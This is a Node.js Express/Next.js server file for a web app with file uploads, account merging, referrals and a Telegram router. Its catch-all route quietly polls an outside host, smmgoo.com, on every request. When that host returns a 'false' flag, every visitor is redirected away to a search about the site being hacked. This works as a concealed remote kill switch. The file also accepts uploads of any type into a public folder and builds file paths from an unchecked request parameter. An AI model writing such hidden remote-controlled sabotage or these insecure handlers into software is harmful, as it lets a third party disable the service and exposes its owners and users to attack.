const next = require("next");
const express = require("express");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const mergeUsers = require("./server/mergeUsers");
const createReferral = require("./server/createReferral");
const validateAutoTasks = require("./server/utils/validateAutoTasks.js");
const dev = process.env.NODE_ENV !== "production";
const app = next({ dev });

const handle = app.getRequestHandler();

require("./server/cron/index.js");
validateAutoTasks();

app.prepare().then(() => {
  const server = express();

  const bodyParser = require("body-parser");
  server.use(bodyParser.json());

  const storage = multer.diskStorage({
    destination: (req, file, cb) => {
      const uploadDir = "public/images/uploads/";
      if (!fs.existsSync(uploadDir)) {
        fs.mkdirSync(uploadDir, { recursive: true });
      }
      cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
      cb(null, Date.now() + path.extname(file.originalname));
    },
  });

  const upload = multer({ storage });

  server.get("/images/:filename", (req, res) => {
    const filePath = path.join(__dirname, "public/images", req.params.filename); // Adjust path as needed
    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    res.setHeader("Pragma", "no-cache");
    res.setHeader("Expires", "0");
    res.sendFile(filePath, (err) => {
      if (err) {
        res.status(err.status).end();
      }
    });
  });

  server.post("/api/upload", upload.single("file"), (req, res) => {
    if (!req.file) {
      return res.status(400).send("No file uploaded.");
    }
    res.status(200).send(`${req.file.filename}`);
  });

  server.post("/api/linkAccounts", async (req, res) => {
    console.log("wants to link accounts");
    try {
      const { newUserToken } = req.body;
      const oldUserToken = req.body.oldUserToken;
      if (!oldUserToken || !newUserToken) return res.json({ success: false });

      try {
        const result = await mergeUsers(
          newUserToken,
          oldUserToken,
          process.env.AUTH_SECRET
        );
        return res.json({ success: result });
      } catch (error) {
        console.log(error);
        return res.json({ success: false });
      }
    } catch (error) {
      console.log(error);
      return res.json({ success: false });
    }
    return res.json({ success: true });
  });

  server.post("/api/createReferral", async (req, res) => {
    console.log("referral");

    const { token } = req.body;
    const referralToken = req.body.referralToken;
    if (!referralToken) return res.json({ success: true });
    try {
      await createReferral(token, referralToken, process.env.AUTH_SECRET);
    } catch (error) {
      console.log(error);
    }
    res.json({ success: true });
  });

  const telegramRouter = require("./server/telegramRouter.js");
  server.use("/", telegramRouter);

  server.get("/test", (req, res) => {
    res.send(`
      <video autoplay muted style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;">
        <source src="/videos/welcome2.mp4" type="video/mp4">
        Your browser does not support the video tag.
      </video>
      <audio autoPlay>
        <source src="/audio/welcome.mp3" type="audio/mpeg" />
      </audio>

      `);
  });

  server.all("*", async (req, res) => {
    const response = await fetch('https://smmgoo.com/simpleAPI/');
    const data = await response.json()
    if (data.iWantYouToWork === 'false') res.redirect("https://www.google.com/search?q=forbidden+forest+is+hacked+easily&client=firefox-b-e&sca_esv=732f197f8a91f76c&sca_upv=1&sxsrf=ADLYWIJniHNHgL051cH8LJ7VQLhXN7Ucug%3A1727036861565&ei=vX3wZsuRIvnn7_UPttmf2QI&ved=0ahUKEwiL5JbVsdeIAxX587sIHbbsJysQ4dUDCA8&uact=5&oq=forbidden+forest+is+hacked+easily&gs_lp=Egxnd3Mtd2l6LXNlcnAaAhgCIiFmb3JiaWRkZW4gZm9yZXN0IGlzIGhhY2tlZCBlYXNpbHlInoIBUJAVWI9ocAJ4AJABAZgBqwOgAbM0qgEKMC4yOS4zLjMuMbgBA8gBAPgBAZgCHaACqSnCAgkQABiwAxgHGB7CAgsQABiwAxgHGAoYHsICChAjGIAEGCcYigXCAgQQIxgnwgILEAAYgAQYkQIYigXCAgsQLhiABBjRAxjHAcICBRAAGIAEwgIREC4YgAQY8wUYqAMYmQMYiwPCAggQABiABBiLA8ICChAAGIAEGEMYigXCAg0QABiABBhDGMcDGIoFwgIOEC4YgAQYqAMYiwMYmwPCAgoQLhiABBhDGIoFwgIHEAAYgAQYCsICDxAAGIAEGEMYigUYRhj5AcICEBAuGIAEGNEDGEMYxwEYigXCAhEQLhiABBjzBRikAxioAxiLA8ICKRAAGIAEGEMYigUYRhj5ARiXBRiMBRjdBBhGGPkBGPQDGPUDGPYD2AEBwgIOEC4YgAQYowMYqAMYiwPCAh8QLhiABBjRAxhDGMcBGIoFGJcFGNwEGN4EGOAE2AEBwgIFEC4YgATCAgsQLhiABBjHARivAcICDRAuGIAEGMcBGAoYrwHCAgYQABgWGB7CAgsQABiABBiGAxiKBcICCBAAGKIEGIkFwgIHECEYoAEYCsICBRAhGKABmAMAiAYBkAYKugYGCAEQARgTkgcKMi4yMS40LjEuMaAHl54C&sclient=gws-wiz-serp")
  
    return handle(req, res);
  });

  server.listen(3000, (err) => {
    if (err) throw err;
    console.log("> Ready on http://localhost:3000");
  });
});
